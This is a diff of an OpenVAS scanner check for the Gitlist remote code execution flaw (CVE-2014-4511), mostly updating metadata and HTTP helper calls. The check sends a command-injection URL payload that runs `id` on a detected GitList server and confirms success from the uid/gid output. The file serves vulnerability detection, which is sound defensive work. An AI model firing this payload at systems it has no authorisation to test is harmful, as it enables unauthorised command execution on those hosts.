@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_gitlist_rce_06_14.nasl 2780 2016-03-04 13:12:04Z antu123 $
+# $Id: gb_gitlist_rce_06_14.nasl 5698 2017-03-23 14:04:51Z cfi $
 #
 # Gitlist Remote Code Execution Vulnerability
 #
@@ -43,17 +43,11 @@ if (description)
  script_cve_id("CVE-2014-4511");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
- script_version ("$Revision: 2780 $");
-
+ script_version ("$Revision: 5698 $");
  script_name("Gitlist Remote Code Execution Vulnerability");
-
-
  script_xref(name:"URL", value:"http://hatriot.github.io/blog/2014/06/29/gitlist-rce/");
- 
-
- script_tag(name:"last_modification", value:"$Date: 2016-03-04 14:12:04 +0100 (Fri, 04 Mar 2016) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-23 15:04:51 +0100 (Thu, 23 Mar 2017) $");
  script_tag(name:"creation_date", value:"2014-06-30 13:00:23 +0200 (Mon, 30 Jun 2014)");
- script_summary("Determine if it is possible to execute a command");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
@@ -76,18 +70,14 @@ include("http_func.inc");
 include("http_keepalive.inc");
 
 port = get_http_port( default:80 );
-if( ! get_port_state( port ) ) exit( 0 );
 
-dirs = make_list( "/gitlist/", "/git/", cgi_dirs() );
+foreach dir( make_list_unique( "/gitlist", "/git", cgi_dirs( port:port ) ) ) {  
 
-foreach dir ( dirs )
-{  
-  url = dir;
-  req = http_get( item:url, port:port );
-  buf = http_send_recv( port:port, data:req, bodyonly:FALSE );
+  if( dir == "/" ) dir = "";
+  url = dir + "/";
+  buf = http_get_cache( item:url, port:port );
 
-  if( egrep( pattern:"Powered by.*GitList", string:buf ) )
-  {
+  if( egrep( pattern:"Powered by.*GitList", string:buf ) ) {
     repos = eregmatch( pattern:'class="icon-folder-open icon-spaced"></i> <a href="([^"]+)">', string:buf );
     if( isnull( repos[1] ) ) continue;
 
@@ -95,10 +85,9 @@ foreach dir ( dirs )
 
     url = repo + 'blame/master/""</%60id%60';
     req = http_get( item:url, port:port );
-    buf = http_send_recv( port:port, data:req, bodyonly:FALSE );
+    buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
 
-    if( buf =~ "uid=[0-9]+.*gid=[0-9]+" )
-    {
+    if( buf =~ "uid=[0-9]+.*gid=[0-9]+" ) {
       req_resp = 'Request:\n' + req + '\nResponse:\n' + buf;
       security_message( port:port, expert_info:req_resp );
       exit( 0 );
@@ -107,4 +96,3 @@ foreach dir ( dirs )
 }
 
 exit( 99 );
-
